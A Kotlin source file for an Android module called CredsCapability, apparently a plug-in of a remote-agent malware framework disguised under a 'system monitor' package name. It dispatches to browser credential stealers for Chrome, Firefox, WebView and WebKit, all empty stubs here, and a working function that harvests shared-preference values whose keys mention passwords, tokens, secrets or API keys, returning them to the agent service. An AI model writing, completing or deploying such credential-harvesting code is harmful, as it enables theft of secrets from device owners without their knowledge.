package com.system.monitor.capabilities

import android.content.Context
import android.content.SharedPreferences
import android.database.Cursor
import android.net.Uri
import android.webkit.WebViewDatabase
import com.google.gson.Gson
import com.system.monitor.AgentService
import java.io.File

class CredsCapability(private val service: AgentService) : AgentService.Capability {

    private val gson = Gson()

    override fun execute(args: String?): Any {
        val params = gson.fromJson(args ?: "{}", Params::class.java)
        val targets = params.targets?.ifEmpty { listOf("chrome", "firefox", "webview", "shared_prefs", "webkit") } ?: listOf("chrome", "firefox", "webview", "shared_prefs", "webkit")
        val allCreds = mutableListOf<Map<String, Any>>()
        targets.forEach { target ->
            when (target) {
                "chrome" -> allCreds.addAll(stealChrome())
                "firefox" -> allCreds.addAll(stealFirefox())
                "webview" -> allCreds.addAll(stealWebView())
                "shared_prefs" -> allCreds.addAll(stealSharedPrefs())
                "webkit" -> allCreds.addAll(stealWebKit())
            }
        }
        return mapOf("credentials" to allCreds)
    }

    private fun stealChrome(): List<Map<String, Any>> = emptyList()
    private fun stealFirefox(): List<Map<String, Any>> = emptyList()
    private fun stealWebView(): List<Map<String, Any>> = emptyList()
    private fun stealWebKit(): List<Map<String, Any>> = emptyList()

    private fun stealSharedPrefs(): List<Map<String, Any>> {
        val creds = mutableListOf<Map<String, Any>>()
        val prefsDir = File(service.filesDir.parent, "shared_prefs")
        prefsDir.listFiles()?.forEach { file ->
            val prefs = service.getSharedPreferences(file.nameWithoutExtension, Context.MODE_PRIVATE)
            prefs.all.forEach { (key, value) ->
                if (key.lowercase().contains("password") || key.lowercase().contains("token") || key.lowercase().contains("secret") || key.lowercase().contains("api")) {
                    creds.add(mapOf("source" to "shared_prefs", "file" to file.name, "key" to key, "value" to value.toString()))
                }
            }
        }
        return creds
    }

    override fun cleanup() {}

    data class Params(val targets: List<String>? = null)
}